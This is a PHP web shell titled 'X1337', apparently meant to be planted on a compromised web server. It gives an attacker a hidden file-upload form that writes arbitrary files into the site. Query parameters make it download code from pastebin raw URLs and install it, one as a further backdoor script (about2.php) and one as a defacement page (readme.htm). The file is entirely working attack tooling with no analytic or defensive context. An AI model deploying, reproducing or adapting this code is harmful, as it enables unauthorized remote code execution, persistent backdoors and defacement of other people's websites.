<?php
 error_reporting(0);
 $cmd  = $_GET['cmd'];
 $post  = $_POST["upload"];
 $target_file= basename($_FILES["m_upload"]["name"]);
 if($cmd=='shell')
 {
?>
<html>
<head>
<title>X1337</title>
<meta name='author' content='0x1999'>
<meta charset="UTF-8">
<style type='text/css'>
@import url(https://fonts.googleapis.com/css?family=Abel);
html {
	background: #000000;
	color: #ffffff;
	font-family: 'Abel';
	font-size: 13px;
	width: 100%;
}
</style>
<center>
<header>   
<pre style="text-align: center"><font color="magenta"> 
	
██╗  ██╗ ██╗██████╗ ██████╗ ███████╗
╚██╗██╔╝███║╚════██╗╚════██╗╚════██║
 ╚███╔╝ ╚██║ █████╔╝ █████╔╝    ██╔╝
 ██╔██╗  ██║ ╚═══██╗ ╚═══██╗   ██╔╝ 
██╔╝ ██╗ ██║██████╔╝██████╔╝   ██║  
╚═╝  ╚═╝ ╚═╝╚═════╝ ╚═════╝    ╚═╝  
                                    

</pre></header></head></html>
<?php
  echo "<form action='' method='post' enctype='multipart/form-data'>
";
  echo "<input type='file' name='m_upload'>";
  echo "<input type='submit' name='upload' value='Upload'>";
  echo "</form>
";
  echo "</center>
";
 }
 
 if(isset($_POST["upload"]))
  {
   if(move_uploaded_file($_FILES["m_upload"]["tmp_name"], $target_file))
  {
   echo "<center>
upload sukses !!</center>
";
   header("location:$target_file");
 }
}


if(isset($_GET["shell"])){
$anak1 = file_get_contents("https://pastebin.com/raw/ADRaLEDs");
$nggawe1 = fopen("about2.php","w") or die ("gabisa bro");
fwrite($nggawe1,$anak1);
fclose($nggawe1);
header ("Location:about2.php");
chmod("about2.php",0644);}
//////////////////////////////
if(isset($_GET["deface"])){
$anak = file_get_contents("https://pastebin.com/raw/VWix9kvx");
$nggawe = fopen("readme.htm","w") or die ("gabisa bro");
fwrite($nggawe,$anak);
fclose($nggawe);
header ("Location:readme.htm");}
?>